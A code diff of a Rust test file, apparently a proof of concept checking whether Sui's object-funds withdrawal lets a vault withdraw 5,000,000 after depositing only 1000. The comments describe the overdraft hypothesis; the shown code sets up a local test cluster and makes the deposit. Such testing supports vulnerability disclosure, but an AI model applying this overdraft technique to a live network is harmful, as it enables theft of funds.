@@ -2,6 +2,18 @@
 // SPDX-License-Identifier: Apache-2.0
 
 //! PoC: Object Withdrawal Amount Bypass — FINAL v4 (FIXED)
+//!
+//! HYPOTHESIS: withdraw_funds_from_object(obj, amount) succeeds in VM
+//! even when amount >> actual_balance, because NO balance check exists
+//! in any layer before settlement.
+//!
+//! TEST:
+//!   1. Deposit 1000 into vault
+//!   2. Withdraw 5,000,000 from vault (5000x overdraft)
+//!   3. Check TX status
+//!
+//! EXPECTED IF VULNERABLE: TX Status = SUCCESS
+//! EXPECTED IF FIXED:      TX Status = FAIL (InsufficientFunds or similar)
 
 use sui_test_transaction_builder::FundSource;
 use sui_types::effects::TransactionEffectsAPI;
@@ -9,7 +21,7 @@ use sui_types::base_types::SuiAddress;
 use test_cluster::addr_balance_test_env::TestEnvBuilder;
 
 #[tokio::test]
-async fn test_object_withdrawal_amount_bypass() {
+async fn test_no_balance_check_on_object_withdrawal() {  // ← الاسم المطلوب من الـ workflow
     println!("\n");
     println!("========================================");
     println!("  PoC: Object Withdrawal Amount Bypass");
@@ -21,7 +33,7 @@ async fn test_object_withdrawal_amount_bypass() {
         .with_num_validators(1)
         .with_proto_override_cb(Box::new(|_, mut cfg| {
             cfg.set_enable_object_funds_withdraw_for_testing(true);
-            cfg.enable_address_balance_gas_payments_for_testing(); // ← FIX #1: بدون set_
+            cfg.enable_address_balance_gas_payments_for_testing();
             cfg
         }))
         .build()
@@ -66,13 +78,13 @@ async fn test_object_withdrawal_amount_bypass() {
     let gas_deposit_tx = env.gas_objects[&sender][0];
     let gas_deposit_fund = env.gas_objects[&sender][1];
 
-    let vault_addr: SuiAddress = vault_id.into(); // ← FIX #2: convert ObjectID → SuiAddress
+    let vault_addr: SuiAddress = vault_id.into();
 
     let tx = env
         .tx_builder_with_gas(sender, gas_deposit_tx)
         .transfer_sui_to_address_balance(
             FundSource::coin(gas_deposit_fund),
-            vec![(1000u64, vault_addr)], // ← FIX #2: use converted address
+            vec![(1000u64, vault_addr)],
         )
         .build();
     let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
